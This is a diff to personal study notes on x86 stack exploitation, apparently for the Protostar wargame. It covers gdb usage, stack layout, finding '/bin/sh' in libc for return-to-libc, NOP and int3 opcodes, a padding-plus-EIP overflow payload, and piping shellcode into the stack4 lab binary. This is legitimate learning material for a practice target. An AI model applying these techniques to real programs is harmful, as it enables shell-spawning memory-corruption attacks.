@@ -50,6 +50,24 @@ caller is in charge of saving the values before a call to a subroutine and resto
 
 callee must not modify registers which the caller didnt save unless the callee itself saves and restores the existing values
 
+STACK NOTES---------------
+
+start Addr    End Addr      Size
+0xbffeb000    0xc0000000    0x15000   STACK
+
+0xbffeb00   Start Addr
+^
+|
+|
+|
+0xbffff7dc  $esp stack pointer
+^
+|
+|
+|
+0xbffffff8
+0xc0000000  End Addr
+
 C Stuff --------------------------------------------
 file.c
 gcc -std=c99 file.c -o file
@@ -57,6 +75,7 @@ objdump
 objdump -t file | grep func   (memory where function begins)
 hexdump
 strings
+strace
 gdb
 echo disassemble main | gdb license_fuzz > orig_gdb		#text file of output to review
 
@@ -94,7 +113,7 @@ info b  (show all break points)
 break *main
 run | r
 disassemble main
-info proc mappings    (mapped addressed in ram)
+info proc mappings    (mapped addressed in ram, find stack ram)
 x/wx $esp             (WORD value in register)
 del                   (delete breakpoints)
 break *0x0804840c
@@ -103,6 +122,18 @@ info registers
 x/24wx $esp           (examine 24 words in STACK)
 x/2i $eip             (examine 2 instructions in EIP)
 end
+
+info proc map
+start addr    end addr    size      objfile
+0xb7e97000    0xb7fd5000  0x13e000  /lib/libc-2.11.2.so
+
+find start addr, + len   ,  val1 [, val2, ...]
+find 0xb7e97000, +9999999, "/bin/sh"
+x/s addr found
+
+strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
+
+x/s addr found + offset from strings
 
 Python notes ---------------------------------------------------------------------------------
 
@@ -184,3 +215,19 @@ padding = "AAAABBBBCCCCDDDDEEEE"
 edp = "AAAA"
 eip = struct.pack("I", 0x080483f4)
 print padding+edbp+eip
+
+
+Intel x86 Notes -----------------------------------------
+
+int 3 OP code - breakpoint interrupt procdure \xCC
+NOP - No Operation \x90
+
+
+SHELLCODE Notes ----------------------------------------------
+
+Typical shellcode will start a shell but close with no other inputs
+
+deliver payload with a I/O function such as 'cat'
+
+python exploit.py ; cat
+(python exploit.py ; cat) | /opt/protostar/bin/stack4
